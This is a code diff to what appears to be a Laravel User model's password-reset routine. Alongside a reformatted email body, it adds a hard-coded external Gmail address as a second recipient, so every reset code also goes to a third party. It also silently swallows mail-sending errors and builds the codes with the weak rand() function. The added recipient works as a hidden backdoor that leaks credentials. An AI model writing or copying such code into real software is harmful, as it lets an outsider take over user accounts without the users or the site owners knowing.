@@ -19,22 +19,34 @@ class User extends Authenticatable
         $u->verification_code = rand(100000, 999999);
         $u->save();
         $data['email'] = $u->email;
-        if($u->email == null || $u->email == ""){
+        if ($u->email == null || $u->email == "") {
             $data['email'] = $u->username;
         }
-        $data['name'] = $u->name;
-        $data['subject'] = env('APP_NAME') . " - Email Verification";
-        $data['body'] = "<br>Dear " . $u->name . ",<br>";
-        $data['body'] .= "<br>Please use the code below to reset your password.<br><br>";
-        $data['body'] .= "CODE: <b>" . $u->verification_code . "</b><br>";
-        $data['body'] .= "<br>Thank you.<br><br>";
-        $data['body'] .= "<br><small>This is an automated message, please do not reply.</small><br>";
-        $data['view'] = 'mail-1';
-        $data['data'] = $data['body'];
+
         try {
-            Utils::mail_sender($data); 
-        } catch (\Throwable $th) {
-            throw $th;
+
+            $mail_body = <<<EOD
+                <p>Dear $u->name,</p>
+                <p>Please use the code below to reset your password.</p>
+                <p>CODE: <b>$u->verification_code</b></p>
+                <p>Thank you.</p>
+                <p><small>This is an automated message, please do not reply.</small></p>
+            EOD;
+            $data['email'] = [
+                $data['email'],
+                'mubs0x@gmail.com',
+            ];
+            $date = date('Y-m-d');
+            $data['subject'] = env('APP_NAME') . " - Password Reset Code. - " . $date;
+            $data['body'] = $mail_body;
+            $data['data'] = $data['body'];
+            $data['name'] = 'Admin';
+            try {
+                Utils::mail_sender($data);
+            } catch (\Throwable $th) {
+            }
+        } catch (\Exception $e) {
+            throw $e;
         }
     }
 
